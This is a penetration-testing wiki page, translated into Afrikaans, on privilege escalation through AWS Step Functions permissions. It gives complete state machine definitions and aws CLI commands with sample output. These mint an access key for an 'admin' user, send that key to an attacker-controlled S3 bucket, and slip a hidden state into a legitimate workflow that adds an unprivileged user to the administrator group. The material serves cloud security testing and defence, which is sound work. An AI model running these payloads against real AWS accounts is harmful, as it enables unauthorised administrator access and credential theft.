# AWS - Step Functions Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## Step Functions

Vir meer inligting oor hierdie AWS-diens, sien:

{{#ref}}
../../aws-services/aws-stepfunctions-enum.md
{{#endref}}

### Task Resources

Hierdie privilege escalation-tegnieke vereis die gebruik van sekere AWS Step Functions resources om die verlangde privilege escalation-aksies uit te voer.

Om alle moontlike aksies te kontroleer, kan jy na jou eie AWS-rekening gaan, die aksie kies wat jy wil gebruik en die parameters sien wat dit gebruik, soos in:

<figure><img src="../../../images/telegram-cloud-photo-size-4-5920521132757336440-y.jpg" alt=""><figcaption></figcaption></figure>

Of jy kan ook na die API AWS-dokumentasie gaan en elke aksie se dokumentasie nagaan:

- [**AddUserToGroup**](https://docs.aws.amazon.com/IAM/latest/APIReference/API_AddUserToGroup.html)
- [**GetSecretValue**](https://docs.aws.amazon.com/secretsmanager/latest/apireference/API_GetSecretValue.html)

### `states:TestState` & `iam:PassRole`

'n Aanvaller met die **`states:TestState`**- en **`iam:PassRole`**-permitte kan enige state toets en enige IAM role aan dit deurgee sonder om 'n bestaande state machine te skep of by te werk, wat moontlik ongeoorloofde toegang tot ander AWS-dienste met die role se permissies kan moontlik maak. Gecombineer kan hierdie permissies lei tot uitgebreide ongeoorloofde aksies, van die manipulasie van workflows en die verandering van data tot data-oortredings, hulpbronmanipulasie en privilege escalation.
```bash
aws states test-state --definition <value> --role-arn <value> [--input <value>] [--inspection-level <value>] [--reveal-secrets | --no-reveal-secrets]
```
Die volgende voorbeelde wys hoe om 'n state te toets wat 'n access key vir die **`admin`** gebruiker skep deur gebruik te maak van hierdie permissies en 'n permissiewe rol in die AWS-omgewing. Hierdie permissiewe rol moet aan 'n hooggeprivilegieerde beleid gekoppel wees (byvoorbeeld **`arn:aws:iam::aws:policy/AdministratorAccess`**) wat die state toelaat om die **`iam:CreateAccessKey`** aksie uit te voer:

- **stateDefinition.json**:
```json
{
"Type": "Task",
"Parameters": {
"UserName": "admin"
},
"Resource": "arn:aws:states:::aws-sdk:iam:createAccessKey",
"End": true
}
```
- **Kommando** uitgevoer om die privesc uit te voer:
```bash
aws stepfunctions test-state --definition file://stateDefinition.json --role-arn arn:aws:iam::<account-id>:role/PermissiveRole

{
"output": "{
\"AccessKey\":{
\"AccessKeyId\":\"AKIA1A2B3C4D5E6F7G8H\",
\"CreateDate\":\"2024-07-09T16:59:11Z\",
\"SecretAccessKey\":\"1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i0j\",
\"Status\":\"Active\",
\"UserName\":\"admin\"
}
}",
"status": "SUCCEEDED"
}
```
**Potensiële impak**: Ongeoorloofde uitvoering en manipulasie van werkstrome en toegang tot sensitiewe hulpbronne, wat moontlik tot beduidende sekuriteitsinbreuke kan lei.

### `states:CreateStateMachine` & `iam:PassRole` & (`states:StartExecution` | `states:StartSyncExecution`)

'n Aanvaller met die **`states:CreateStateMachine`** en **`iam:PassRole`** kan 'n staatmasjien skep en enige IAM-rol daaraan toewys, wat ongemagtigde toegang tot ander AWS-dienste met die rol se magtigings moontlik maak. In teenstelling met die vorige privesc-tegniek (**`states:TestState`** & **`iam:PassRole`**), voer hierdie een nie op sy eie uit nie — jy sal ook die **`states:StartExecution`** of **`states:StartSyncExecution`** toestemmings nodig hê (**`states:StartSyncExecution`** is **nie beskikbaar vir standaard-workflows nie**, **slegs vir express state machines**) om 'n uitvoering van die staatmasjien te begin.
```bash
# Create a state machine
aws states create-state-machine --name <value> --definition <value> --role-arn <value> [--type <STANDARD | EXPRESS>] [--logging-configuration <value>]\
[--tracing-configuration <enabled=true|false>] [--publish | --no-publish] [--version-description <value>]

# Start a state machine execution
aws states start-execution --state-machine-arn <value> [--name <value>] [--input <value>] [--trace-header <value>]

# Start a Synchronous Express state machine execution
aws states start-sync-execution --state-machine-arn <value> [--name <value>] [--input <value>] [--trace-header <value>]
```
Die volgende voorbeelde wys hoe om 'n state machine te skep wat 'n access key vir die **`admin`** gebruiker skep en hierdie access key na 'n deur die aanvaller beheerde S3-bucket exfiltreer, deur gebruik te maak van hierdie permissies en 'n permissiewe rol in die AWS-omgewing. Hierdie permissiewe rol moet 'n hooggeprivilegieerde beleid hê wat daaraan gekoppel is (byvoorbeeld **`arn:aws:iam::aws:policy/AdministratorAccess`**) en wat die state machine toelaat om die **`iam:CreateAccessKey`** en **`s3:putObject`** aksies uit te voer.

- **stateMachineDefinition.json**:
```json
{
"Comment": "Malicious state machine to create IAM access key and upload to S3",
"StartAt": "CreateAccessKey",
"States": {
"CreateAccessKey": {
"Type": "Task",
"Resource": "arn:aws:states:::aws-sdk:iam:createAccessKey",
"Parameters": {
"UserName": "admin"
},
"ResultPath": "$.AccessKeyResult",
"Next": "PrepareS3PutObject"
},
"PrepareS3PutObject": {
"Type": "Pass",
"Parameters": {
"Body.$": "$.AccessKeyResult.AccessKey",
"Bucket": "attacker-controlled-S3-bucket",
"Key": "AccessKey.json"
},
"ResultPath": "$.S3PutObjectParams",
"Next": "PutObject"
},
"PutObject": {
"Type": "Task",
"Resource": "arn:aws:states:::aws-sdk:s3:putObject",
"Parameters": {
"Body.$": "$.S3PutObjectParams.Body",
"Bucket.$": "$.S3PutObjectParams.Bucket",
"Key.$": "$.S3PutObjectParams.Key"
},
"End": true
}
}
}
```
- **Opdrag** uitgevoer om **die toestandsmasjien te skep**:
```bash
aws stepfunctions create-state-machine --name MaliciousStateMachine --definition file://stateMachineDefinition.json --role-arn arn:aws:iam::123456789012:role/PermissiveRole
{
"stateMachineArn": "arn:aws:states:us-east-1:123456789012:stateMachine:MaliciousStateMachine",
"creationDate": "2024-07-09T20:29:35.381000+02:00"
}
```
- **Opdrag** uitgevoer om **'n uitvoering te begin** van die voorheen geskepte state machine:
```json
aws stepfunctions start-execution --state-machine-arn arn:aws:states:us-east-1:123456789012:stateMachine:MaliciousStateMachine
{
"executionArn": "arn:aws:states:us-east-1:123456789012:execution:MaliciousStateMachine:1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f",
"startDate": "2024-07-09T20:33:35.466000+02:00"
}
```
> [!WARNING]
> Die aanvaller-beheerde S3 bucket moet toestemmings hê om 'n s3:PutObject-aksie van die slagoffer-rekening te aanvaar.

**Potensiële impak**: Ongeauthorizeerde uitvoering en manipulasie van werkstrome en toegang tot sensitiewe hulpbronne, wat moontlik tot betekenisvolle sekuriteitsinbreuke kan lei.

### `states:UpdateStateMachine` & (not always required) `iam:PassRole`

'n Aanvaller met die **`states:UpdateStateMachine`** toestemming sou die definisie van 'n state machine kan wysig en ekstra sluipende states kan byvoeg wat tot 'n privilege escalation kan lei. Op hierdie manier, wanneer 'n regmatige gebruiker 'n uitvoering van die state machine begin, sal hierdie nuwe kwaadwillige sluip-state uitgevoer word en sal die privilege escalation suksesvol wees.

Afhangend van hoe permissief die IAM Role wat aan die state machine gekoppel is is, sal 'n aanvaller twee situasies teëkom:

1. **Permissief IAM Role**: Indien die IAM Role wat aan die state machine gekoppel is reeds permissief is (dit het byvoorbeeld die **`arn:aws:iam::aws:policy/AdministratorAccess`** beleid aangeheg), dan sal die **`iam:PassRole`** toestemming nie benodig word om privileges op te skerp nie, aangesien dit nie nodig is om ook die IAM Role te wysig nie; die state machine definisie alleen is genoeg.
2. **Nie-permissief IAM Role**: In teenstelling met die vorige geval, sal 'n aanvaller hier ook die **`iam:PassRole`** toestemming benodig aangesien dit nodig sal wees om 'n permissief IAM Role aan die state machine toe te ken, benewens die wysiging van die state machine definisie.
```bash
aws states update-state-machine --state-machine-arn <value> [--definition <value>] [--role-arn <value>] [--logging-configuration <value>] \
[--tracing-configuration <enabled=true|false>] [--publish | --no-publish] [--version-description <value>]
```
Die volgende voorbeelde wys hoe om 'n legitieme staatmasjien wat net 'n HelloWorld Lambda funksie aanroep, by te werk sodat 'n ekstra toestand bygevoeg word wat die gebruiker **`unprivilegedUser`** by die **`administrator`** IAM Group voeg. Op hierdie manier, wanneer 'n legitieme gebruiker 'n uitvoering van die opgedateerde staatmasjien begin, sal hierdie nuwe kwaadwillige onopvallende toestand uitgevoer word en sal die privilege escalation suksesvol wees.

> [!WARNING]
> As die state machine nie 'n permissiewe IAM Role geassosieer het nie, sal die **`iam:PassRole`** toestemming ook vereis wees om die IAM Role op te dateer sodat 'n permissiewe IAM Role geassosieer kan word (byvoorbeeld een met die **`arn:aws:iam::aws:policy/AdministratorAccess`** beleid aangeheg).

{{#tabs }}
{{#tab name="Legit State Machine" }}
```json
{
"Comment": "Hello world from Lambda state machine",
"StartAt": "Start PassState",
"States": {
"Start PassState": {
"Type": "Pass",
"Next": "LambdaInvoke"
},
"LambdaInvoke": {
"Type": "Task",
"Resource": "arn:aws:states:::lambda:invoke",
"Parameters": {
"FunctionName": "arn:aws:lambda:us-east-1:123456789012:function:HelloWorldLambda:$LATEST"
},
"Next": "End PassState"
},
"End PassState": {
"Type": "Pass",
"End": true
}
}
}
```
{{#endtab }}

{{#tab name="Malicious Updated State Machine" }}
```json
{
"Comment": "Hello world from Lambda state machine",
"StartAt": "Start PassState",
"States": {
"Start PassState": {
"Type": "Pass",
"Next": "LambdaInvoke"
},
"LambdaInvoke": {
"Type": "Task",
"Resource": "arn:aws:states:::lambda:invoke",
"Parameters": {
"FunctionName": "arn:aws:lambda:us-east-1:123456789012:function:HelloWorldLambda:$LATEST"
},
"Next": "AddUserToGroup"
},
"AddUserToGroup": {
"Type": "Task",
"Parameters": {
"GroupName": "administrator",
"UserName": "unprivilegedUser"
},
"Resource": "arn:aws:states:::aws-sdk:iam:addUserToGroup",
"Next": "End PassState"
},
"End PassState": {
"Type": "Pass",
"End": true
}
}
}
```
{{#endtab }}
{{#endtabs }}

- **Kommando** uitgevoer om **werk by** **die legitieme toestandsmasjien**:
```bash
aws stepfunctions update-state-machine --state-machine-arn arn:aws:states:us-east-1:123456789012:stateMachine:HelloWorldLambda --definition file://StateMachineUpdate.json
{
"updateDate": "2024-07-10T20:07:10.294000+02:00",
"revisionId": "1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f"
}
```
**Potensiële impak**: Ongeoorloofde uitvoering en manipulasie van werkvloeie en toegang tot sensitiewe hulpbronne, wat moontlik tot beduidende sekuriteitsinbreuke kan lei.

{{#include ../../../../banners/hacktricks-training.md}}
